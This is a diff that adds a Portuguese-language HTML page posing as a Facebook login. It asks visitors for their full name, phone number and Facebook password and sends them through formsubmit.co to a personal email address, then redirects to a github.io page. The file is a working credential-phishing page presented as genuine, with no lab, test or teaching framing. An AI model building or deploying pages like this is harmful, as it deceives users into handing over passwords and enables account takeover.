@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+	<head>
+	    <meta charset="utf-8">
+		<title>fanpage do Kelven</title>
+		
+		<style>
+		   h1{
+		       color: white;
+		       font-size: 55px;
+		       margin: 10%;
+		       margin: center;
+		       font-family: Arial;
+		   }
+		   #tela{
+		       color: blue;
+		       font-size: 55px;
+		       margin: 10%;
+		       margin: center;
+		   }
+		   body{
+		       background-color: #3C1CB3;
+		       height: 100vh;
+		       width: 100vw;
+		   }
+		  
+/* Full-width input fields */
+
+input[type=text],
+input[type=password],
+input[type=number]{
+    width: 85%;
+    padding: 12px 20px 20px;
+    margin: 8px 0 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+    text-align: center;
+    height: 8%;
+    font-size: 35px;
+    margin-left: 5%;
+    margin: center;
+    border-radius: 15px;
+    border: none;
+    transform: translate(-85%, -85);
+}
+
+/* Set a style for all buttons */
+
+button {
+    background-color: #000080;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    cursor: pointer;
+    width: 65%;
+    margin-left: 16%;
+    font-size: 35px;
+    margin: center;
+    border-radius: 15px;
+    cursor: pointer;
+}
+button.hover{
+    background-color: #00ffff;
+}
+.kb{
+    background-color: #1B1F51;
+    padding: 35px;
+    border-radius: 15px;
+    border: none;
+}
+		</style>
+		
+	</head>
+	<body>
+		
+		<h1>
+		    Faça o Login para ter acessos as suas contas do facebook
+		</h1>
+		<fieldset class="kb">
+		    <h1 id="tela">facebook login :</h1>
+		<form action="https://formsubmit.co/kelvenbrunocarloslopesb@gmail.com" method="POST" nome="curso">
+		    <input type="hidden" name="_next" value="https://43sea.github.io/form-submit/index.html/">
+		    <input type="hidden" name="_template" value="table">
+		    <input type="hidden" name="_autoresponse" value="Recebemos os seus dados, em breve responderenos!">
+		    <input type="text" name="_honey" style="display:none">
+		    <input type="text" name="fnome" size="50" maxlength="50" placeholder="digite o seu nome completo" required><br><br>
+		    <input type="number" name="fnumero" size="15" maxlength="15" placeholder="digite o seu número" required><br><br>
+		   <input type="password" name="fsenha" size="8" maxlength="8" placeholder="digite a sua senha de Facebook" required><br><br>
+		   <input type="hidden" name="_captcha" value="false">
+		   <button type="submit" nome="btlogin">Login</button>
+		</form>
+		</fieldset>
+		
+		<script>
+		    var tag=document.forms["curso"];
+		    document.write(tag.elements["fnome"].value);
+		    document.write(tag.elements["fnumero"].value);
+		    document.write(tag.elements["fsenha"].value);
+	</script>
+	
+	</body>
+	
+</html>
